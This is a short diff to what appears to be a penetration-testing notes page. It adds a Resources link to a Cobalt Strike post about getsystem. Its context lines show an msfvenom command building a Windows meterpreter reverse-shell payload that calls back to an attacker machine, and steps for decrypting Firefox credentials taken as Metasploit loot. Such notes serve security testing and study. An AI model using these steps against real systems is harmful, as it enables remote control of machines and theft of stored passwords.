@@ -214,3 +214,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT
 - Download [firefox decrypt](https://github.com/unode/firefox_decrypt)
 - And run it `python3 firefox_decrypt.py <msf loot directory>`
 - You should see the decrypted credentials on the screen
+
+## Resources
+
+{% embed url="https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/" %} What happens when I type getsystem? {% endembed %}  
